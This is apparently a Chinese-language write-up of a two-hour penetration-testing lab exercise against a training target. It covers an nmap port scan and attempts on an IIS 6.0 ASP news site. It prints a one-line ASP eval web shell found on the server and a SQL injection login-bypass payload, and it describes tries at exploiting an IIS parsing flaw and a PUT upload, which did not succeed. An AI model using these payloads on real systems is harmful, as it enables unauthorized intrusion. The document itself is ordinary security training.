目标

43.139.222.118 

要求

1、渗透时间为2小时，从靶场启动开始计时，2小时后靶场关闭，靶场关闭后可以继续完善渗透报告。
2、按照自己的渗透思路，把渗透当中的关键步骤记录下来，包括搜集到的有用信息、漏洞利用截图、最终成果等，形成简要的渗透文档（doc、docx、pdf、MD）。
3、挖掘指定目标存在的安全漏洞、隐患，获取服务器权限，进行内网渗透。包括不限于数据库、Web应用、中间件、服务器的安全漏洞。
4、根据掌握的网络安全技能，尽可能的找出全部的安全漏洞、安全问题。





## 主机扫描

nmap -sT 43.139.222.118       

Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-22 15:34 CST
Nmap scan report for 43.139.222.118
Host is up (0.044s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
21/tcp    open     ftp
81/tcp    open     hosts2-ns --fblogs新闻文章系统
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   filtered microsoft-ds
3389/tcp  open     ms-wbt-server
7000/tcp  open     afs3-fileserver
8080/tcp  open     http-proxy
49152/tcp open     unknown
49153/tcp open     unknown
49154/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 6.36 seconds



## 打点

主要尝试81端口web

目录扫描

http://43.139.222.118:81/readnews.asp?id=1 

尝试注入，无果，函数未定义

http://43.139.222.118:81/include/conn.asp 源码没有可能也是连接数据库的文件

http://43.139.222.118:81/1.txt（下载页面11111?）

```
<%eval request("bbk")%>
```

考虑文件包含或是已有🐎？

http://43.139.222.118:81/admin/index.asp 

查询前端文章管理员账户，查询默认密码登录，尝试弱口令， 无果

查询历史漏洞存在万能密码：

```
admin'or+'1

密码随意
```

![image-20230222164623630](C:/Users/11634/AppData/Roaming/Typora/typora-user-images/image-20230222164623630.png)



无法上传文件，创建目录自带添加反斜杠，

服务器版本是iis6.0,结合之前带🐎的1.txt考虑解析漏洞

 可以成功创建xxx.asp目录，考虑iisput上传文件进去-0-

![image-20230222171210796](C:/Users/11634/AppData/Roaming/Typora/typora-user-images/image-20230222171210796.png)

但是这里目录做了限制，没办法将文件直接写进去，协议改名和后台改名都会报错

## 总结

做了一些绕过的尝试，可惜时间到了仍未拿到shell

其他的端口服务也没来细看
